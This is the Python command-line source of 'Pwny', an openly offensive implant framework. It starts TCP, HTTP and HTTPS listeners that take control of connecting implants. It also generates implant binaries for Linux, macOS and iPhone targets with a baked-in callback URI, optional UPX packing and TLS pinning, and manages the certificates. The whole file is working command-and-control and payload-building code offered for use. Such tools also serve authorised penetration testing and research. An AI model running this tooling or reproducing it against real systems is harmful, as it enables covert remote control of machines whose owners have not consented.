"""
MIT License

Copyright (c) 2020-2026 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import os
import sys
import glob
import socket
import argparse
import threading

from badges import Badges
from badges.tables import Tables

from pwny.__main__ import Pwny
from pwny.session import PwnySession, PwnyHTTPSession
from pwny.https import HTTPSListener, generate_self_signed, extract_pin
from pwny.certs import CertHive

badges = Badges()
tables = Tables()


def get_templates_dir():
    return os.path.join(
        os.path.dirname(os.path.dirname(__file__)),
        'pwny', 'templates'
    )


def cmd_listen(args):
    """ Start a listener and interact with the connecting implant. """

    if args.proto == 'https':
        keyfile = args.key or ''
        certfile = args.cert or ''

        if args.name:
            hive = CertHive()
            try:
                meta = hive.get(args.name)
            except FileNotFoundError:
                badges.print_error(f"Certificate '{args.name}' not found in hive")
                badges.print_information("Run 'pwny cert list' to see available certificates.")
                sys.exit(1)
            keyfile = meta['keyfile']
            certfile = meta['certfile']

        badges.print_process(f"Starting HTTPS listener on {args.host}:{args.port}")
        listener = HTTPSListener(args.host, str(args.port),
                                 keyfile=keyfile,
                                 certfile=certfile)
        listener.listen()

        badges.print_success(f"TLS pin: {listener.pin}")

        thread = threading.Thread(target=listener.loop, daemon=True)
        thread.start()

        session = PwnyHTTPSession()

        if args.platform:
            session.info['Platform'] = args.platform
        if args.arch:
            session.info['Arch'] = args.arch

        session.open(listener)

        if args.secure:
            session.secure()

        session.interact(banner=not args.no_banner)

        stop_thread = threading.Thread(target=listener.stop, daemon=True)
        stop_thread.start()
        stop_thread.join(timeout=5)
        thread.join(timeout=3)

    elif args.proto == 'http':
        try:
            from pex.proto.http import HTTPListener
        except ImportError:
            badges.print_error("pex is required for HTTP listeners")
            sys.exit(1)

        badges.print_process(f"Starting HTTP listener on {args.host}:{args.port}")
        listener = HTTPListener(args.host, str(args.port))
        listener.listen()

        thread = threading.Thread(target=listener.loop, daemon=True)
        thread.start()

        session = PwnyHTTPSession()

        if args.platform:
            session.info['Platform'] = args.platform
        if args.arch:
            session.info['Arch'] = args.arch

        session.open(listener)

        if args.secure:
            session.secure()

        session.interact(banner=not args.no_banner)

        stop_thread = threading.Thread(target=listener.stop, daemon=True)
        stop_thread.start()
        stop_thread.join(timeout=5)
        thread.join(timeout=3)

    elif args.proto == 'dtcp':
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((args.host, args.port))
        s.listen(2)

        badges.print_process(f"Starting dual-TCP listener on {args.host}:{args.port}")
        badges.print_process("Waiting for egress connection...")
        c1, a1 = s.accept()
        badges.print_success(f"Egress from {a1[0]}:{a1[1]}")

        badges.print_process("Waiting for ingress connection...")
        c2, a2 = s.accept()
        badges.print_success(f"Ingress from {a2[0]}:{a2[1]}")

        session = PwnySession()

        if args.platform:
            session.info['Platform'] = args.platform
        if args.arch:
            session.info['Arch'] = args.arch

        session.open((c1, c2))

        if args.secure:
            session.secure()

        session.interact(banner=not args.no_banner)
        s.close()

    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((args.host, args.port))
        s.listen(1)

        badges.print_process(f"Starting TCP listener on {args.host}:{args.port}")
        badges.print_process("Waiting for connection...")

        c, a = s.accept()
        badges.print_success(f"Connection from {a[0]}:{a[1]}")

        session = PwnySession()

        if args.platform:
            session.info['Platform'] = args.platform
        if args.arch:
            session.info['Arch'] = args.arch

        session.open(c)

        if args.secure:
            session.secure()

        session.interact(banner=not args.no_banner)
        s.close()


def cmd_generate(args):
    """ Generate an implant binary with baked-in options. """

    options = {}
    if args.uri:
        options['uri'] = args.uri
    if args.uuid:
        options['uuid'] = args.uuid
    if args.pin:
        options['pin'] = args.pin
    elif args.name:
        hive = CertHive()
        try:
            meta = hive.get(args.name)
        except FileNotFoundError:
            badges.print_error(f"Certificate '{args.name}' not found in hive")
            badges.print_information("Run 'pwny cert list' to see available certificates.")
            sys.exit(1)
        options['pin'] = meta['pin']
        badges.print_success(f"Using certificate '{args.name}' (pin: {meta['pin']})")
    elif args.uri and args.uri.startswith('https://'):
        certfile = args.cert or 'server.crt'
        keyfile = args.key or 'server.key'

        generate_self_signed(keyfile, certfile)
        pin = extract_pin(certfile)
        options['pin'] = pin

        badges.print_success(f"Generated {certfile} and {keyfile}")
        badges.print_success(f"TLS pin: {pin}")
        badges.print_information(
            f"Use --cert {certfile} --key {keyfile} with 'pwny listen -t https'")

    builder = Pwny(target=args.target, options=options)
    binary = builder.to_binary(format=args.format, pack=args.pack)

    if binary is None:
        path = builder.stat_binary(format=args.format)
        if path is None:
            badges.print_error(
                f"No template found for target '{args.target}' "
                f"format '{args.format}'"
            )
            badges.print_information("Run 'pwny templates' to see available targets.")
            sys.exit(1)

    if args.output == '-':
        sys.stdout.buffer.write(binary)
    else:
        with open(args.output, 'wb') as f:
            f.write(binary)

        os.chmod(args.output, 0o755)
        badges.print_success(f"Written {len(binary)} bytes to {args.output}")


def cmd_templates(args):
    """ List available implant templates. """

    templates_dir = get_templates_dir()

    if not os.path.isdir(templates_dir):
        badges.print_error("No templates directory found.")
        sys.exit(1)

    entries = sorted(os.listdir(templates_dir))
    targets = {}

    for entry in entries:
        if entry.startswith('.') or entry == 'README.md':
            continue

        parts = entry.rsplit('.', 1)
        if len(parts) != 2:
            continue

        triplet, fmt = parts
        targets.setdefault(triplet, []).append(fmt)

    if not targets:
        badges.print_warning("No templates available.")
        return

    data = []
    for triplet in sorted(targets):
        formats = ', '.join(sorted(targets[triplet]))
        data.append((triplet, formats))

    tables.print_table("Templates", ('Target', 'Formats'), *data)


def cmd_check(args):
    """ Check if a template exists for the given target/format. """

    builder = Pwny(target=args.target)
    path = builder.stat_binary(format=args.format)

    if path:
        size = os.path.getsize(path)
        badges.print_success(f"{path} ({size} bytes)")
    else:
        badges.print_error(
            f"No template for target '{args.target}' "
            f"format '{args.format}'"
        )
        sys.exit(1)


def cmd_cert(args):
    """ Manage the certificate hive. """

    hive = CertHive()

    if args.action == 'generate':
        try:
            meta = hive.generate(args.name)
        except FileExistsError:
            badges.print_error(f"Certificate '{args.name}' already exists")
            sys.exit(1)
        badges.print_success(f"Generated certificate '{args.name}'")
        badges.print_information(f"Pin: {meta['pin']}")

    elif args.action == 'list':
        entries = hive.list()
        if not entries:
            badges.print_warning("No certificates in the hive.")
            return
        data = []
        for entry in entries:
            data.append((entry['name'], entry['pin']))
        tables.print_table("Certificates", ('Name', 'Pin'), *data)

    elif args.action == 'show':
        try:
            meta = hive.get(args.name)
        except FileNotFoundError:
            badges.print_error(f"Certificate '{args.name}' not found")
            sys.exit(1)
        badges.print_information(f"Name:     {meta['name']}")
        badges.print_information(f"Pin:      {meta['pin']}")
        badges.print_information(f"Cert:     {meta['certfile']}")
        badges.print_information(f"Key:      {meta['keyfile']}")

    elif args.action == 'delete':
        try:
            hive.delete(args.name)
        except FileNotFoundError:
            badges.print_error(f"Certificate '{args.name}' not found")
            sys.exit(1)
        badges.print_success(f"Deleted certificate '{args.name}'")

    elif args.action == 'rename':
        try:
            meta = hive.rename(args.name, args.new_name)
        except FileNotFoundError:
            badges.print_error(f"Certificate '{args.name}' not found")
            sys.exit(1)
        except FileExistsError:
            badges.print_error(f"Certificate '{args.new_name}' already exists")
            sys.exit(1)
        badges.print_success(f"Renamed '{args.name}' -> '{meta['name']}'")


def main():
    parser = argparse.ArgumentParser(
        prog='pwny',
        description='Pwny implant framework — build, deploy, and interact.',
    )
    sub = parser.add_subparsers(dest='command')

    # --- listen ---
    p_listen = sub.add_parser(
        'listen',
        help='Start a listener and interact with a connecting implant.',
    )
    p_listen.add_argument(
        'host',
        help='Address to bind to (e.g. 0.0.0.0).',
    )
    p_listen.add_argument(
        'port',
        type=int,
        help='Port to listen on.',
    )
    p_listen.add_argument(
        '-t', '--proto',
        choices=['tcp', 'dtcp', 'http', 'https'],
        default='tcp',
        help='Listener protocol (default: tcp).',
    )
    p_listen.add_argument(
        '-p', '--platform',
        default=None,
        help='Target platform hint (e.g. linux, macos, iphone).',
    )
    p_listen.add_argument(
        '-a', '--arch',
        default=None,
        help='Target architecture hint (e.g. x64, aarch64).',
    )
    p_listen.add_argument(
        '-s', '--secure',
        action='store_true',
        help='Establish encrypted session after connect.',
    )
    p_listen.add_argument(
        '--no-banner',
        action='store_true',
        help='Suppress the startup banner.',
    )
    p_listen.add_argument(
        '--cert',
        default=None,
        help='Path to PEM certificate for HTTPS listener.',
    )
    p_listen.add_argument(
        '--key',
        default=None,
        help='Path to PEM private key for HTTPS listener.',
    )
    p_listen.add_argument(
        '-n', '--name',
        default=None,
        help='Certificate name from the hive (use with -t https).',
    )
    p_listen.set_defaults(func=cmd_listen)

    # --- generate ---
    p_gen = sub.add_parser(
        'generate',
        help='Generate an implant binary with baked-in options.',
    )
    p_gen.add_argument(
        'target',
        help='Target triplet (e.g. x86_64-linux-musl, aarch64-apple-darwin).',
    )
    p_gen.add_argument(
        '-f', '--format',
        default='exe',
        help='Binary format: exe, bin (default: exe).',
    )
    p_gen.add_argument(
        '-o', '--output',
        default='pwny.out',
        help="Output file path (use '-' for stdout).",
    )
    p_gen.add_argument(
        '-u', '--uri',
        default=None,
        help='Callback URI (e.g. tcp://10.0.0.1:8888).',
    )
    p_gen.add_argument(
        '-U', '--uuid',
        default=None,
        help='Session UUID.',
    )
    p_gen.add_argument(
        '--pin',
        default=None,
        help='TLS public key pin (sha256//base64hash) for HTTPS URIs.',
    )
    p_gen.add_argument(
        '--cert',
        default=None,
        help='Output path for generated PEM certificate (default: server.crt).',
    )
    p_gen.add_argument(
        '--key',
        default=None,
        help='Output path for generated PEM private key (default: server.key).',
    )
    p_gen.add_argument(
        '-n', '--name',
        default=None,
        help='Certificate name from the hive (use with https:// URIs).',
    )
    p_gen.add_argument(
        '--pack',
        action='store_true',
        help='Pack the binary with UPX (requires upx in PATH).',
    )
    p_gen.set_defaults(func=cmd_generate)

    # --- templates ---
    p_tpl = sub.add_parser(
        'templates',
        help='List available implant templates.',
    )
    p_tpl.set_defaults(func=cmd_templates)

    # --- check ---
    p_chk = sub.add_parser(
        'check',
        help='Check if a template exists for the given target.',
    )
    p_chk.add_argument(
        'target',
        help='Target triplet.',
    )
    p_chk.add_argument(
        '-f', '--format',
        default='exe',
        help='Binary format (default: exe).',
    )
    p_chk.set_defaults(func=cmd_check)

    # --- cert ---
    p_cert = sub.add_parser(
        'cert',
        help='Manage the certificate hive.',
    )
    cert_sub = p_cert.add_subparsers(dest='action')

    p_cert_gen = cert_sub.add_parser(
        'generate',
        help='Generate a new named certificate.',
    )
    p_cert_gen.add_argument(
        'name',
        help='Certificate name.',
    )

    p_cert_list = cert_sub.add_parser(
        'list',
        help='List all certificates in the hive.',
    )

    p_cert_show = cert_sub.add_parser(
        'show',
        help='Show details for a named certificate.',
    )
    p_cert_show.add_argument(
        'name',
        help='Certificate name.',
    )

    p_cert_del = cert_sub.add_parser(
        'delete',
        help='Delete a named certificate.',
    )
    p_cert_del.add_argument(
        'name',
        help='Certificate name.',
    )

    p_cert_rename = cert_sub.add_parser(
        'rename',
        help='Rename a certificate.',
    )
    p_cert_rename.add_argument(
        'name',
        help='Current certificate name.',
    )
    p_cert_rename.add_argument(
        'new_name',
        help='New certificate name.',
    )

    p_cert.set_defaults(func=cmd_cert)

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        sys.exit(1)

    if args.command == 'cert' and not args.action:
        p_cert.print_help()
        sys.exit(1)

    args.func(args)


if __name__ == '__main__':
    main()
